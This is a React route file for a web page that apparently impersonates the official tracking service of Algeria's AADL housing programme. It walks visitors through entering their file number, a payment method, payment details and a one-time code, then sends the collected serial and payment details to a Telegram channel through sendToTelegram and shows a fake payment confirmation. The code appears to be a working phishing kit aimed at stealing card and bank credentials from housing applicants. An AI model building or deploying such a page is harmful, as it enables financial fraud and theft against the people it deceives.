import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import { CheckCircle2, RotateCcw } from "lucide-react";
import { SiteHeader } from "@/components/site-header";

import { ProblemSelection } from "@/components/problem-selection";
import { SerialEntry } from "@/components/serial-entry";
import { PaymentMethod } from "@/components/payment-method";
import {
  PaymentDetailsForm,
  type PaymentDetails,
} from "@/components/payment-details";
import { OtpEntry } from "@/components/otp-entry";
import { Button } from "@/components/ui/button";
import { paymentMethods, type PaymentMethodId } from "@/lib/aadl-data";
import { sendToTelegram } from "@/routes/api/send-telegram";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "متابعة ملف عدل — AADL" },
      {
        name: "description",
        content:
          "تابع ملفك في برنامج عدل السكني بالجزائر: حالة الملف، الترتيب، الوثائق، والدفع.",
      },
      { property: "og:title", content: "متابعة ملف عدل — AADL" },
      {
        property: "og:description",
        content: "تابع ملفك في برنامج عدل السكني بالجزائر: حالة الملف، الترتيب، الوثائق، والدفع.",
      },
    ],
  }),
  component: Index,
});

function Index() {
  const [step, setStep] = useState(0);
  const [problemId, setProblemId] = useState("");
  const [serial, setSerial] = useState("");
  const [paymentMethodId, setPaymentMethodId] = useState<PaymentMethodId | undefined>();
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails | undefined>();
  const [confirmed, setConfirmed] = useState(false);

  function handleReset() {
    setProblemId("");
    setSerial("");
    setPaymentMethodId(undefined);
    setPaymentDetails(undefined);
    setConfirmed(false);
    setStep(0);
  }

  // Send data to Telegram when confirmation is done
  useEffect(() => {
    if (confirmed && paymentDetails && paymentMethodId) {
      const paymentLabel = paymentMethods.find((m) => m.id === paymentMethodId)?.title || paymentMethodId;
      
      // Convert PaymentDetails to a simple object for sending
      const detailsObj = paymentDetails as Record<string, any>;
      const { method, ...details } = detailsObj;
      
      sendToTelegram({
        problemId,
        serial,
        paymentMethodId,
        paymentLabel,
        paymentDetails: details,
      }).catch((error) => {
        console.error("[v0] Failed to send to Telegram:", error);
      });
    }
  }, [confirmed, paymentDetails, paymentMethodId, problemId, serial]);

  const paymentLabel = paymentMethods.find((m) => m.id === paymentMethodId)?.title;

  return (
    <div dir="rtl" lang="ar" className="flex min-h-screen flex-col bg-background">
      <SiteHeader />

      <main className="mx-auto w-full max-w-3xl flex-1 px-4 py-8">
        <div className="mx-auto max-w-xl">
          {!confirmed && step === 0 && (
            <ProblemSelection
              onSelect={(id) => {
                setProblemId(id);
                setStep(1);
              }}
            />
          )}
          {!confirmed && step === 1 && (
            <SerialEntry
              problemId={problemId}
              onBack={() => setStep(0)}
              onSubmit={(value) => {
                setSerial(value);
                setStep(2);
              }}
            />
          )}
          {!confirmed && step === 2 && (
            <PaymentMethod
              initial={paymentMethodId}
              onBack={() => setStep(1)}
              onSubmit={(method) => {
                setPaymentMethodId(method);
                setStep(3);
              }}
            />
          )}
          {!confirmed && step === 3 && paymentMethodId && (
            <PaymentDetailsForm
              method={paymentMethodId}
              onBack={() => setStep(2)}
              onSubmit={(details) => {
                setPaymentDetails(details);
                setStep(4);
              }}
            />
          )}
          {!confirmed && step === 4 && paymentMethodId && (
            <OtpEntry
              method={paymentMethodId}
              onBack={() => setStep(3)}
              onSubmit={() => setConfirmed(true)}
            />
          )}
          {confirmed && (
            <section className="flex flex-col items-center gap-5 rounded-2xl border border-border bg-card p-8 text-center">
              <span className="flex size-16 items-center justify-center rounded-full bg-accent/15 text-accent">
                <CheckCircle2 className="size-9" aria-hidden="true" />
              </span>
              <div className="flex flex-col gap-2">
                <h1 className="text-2xl font-bold text-foreground">تم تأكيد العملية</h1>
                <p className="text-sm text-muted-foreground">
                  تم تأكيد الدفع بنجاح عبر{" "}
                  <span className="font-bold text-foreground">{paymentLabel}</span> للملف رقم{" "}
                  <span className="font-mono" dir="ltr">{serial}</span>.
                </p>
              </div>
              <Button
                type="button"
                variant="outline"
                onClick={handleReset}
                className="bg-transparent"
              >
                <RotateCcw className="size-4" aria-hidden="true" />
                متابعة ملف آخر
              </Button>
            </section>
          )}
        </div>
      </main>

      <footer className="border-t border-border bg-card py-4">
        <p className="mx-auto max-w-3xl px-4 text-center text-xs text-muted-foreground">
          مساعدة مكتتبي برنامج عدل على متابعة ملفاتهم — الجزائر
        </p>
      </footer>
    </div>
  );
}
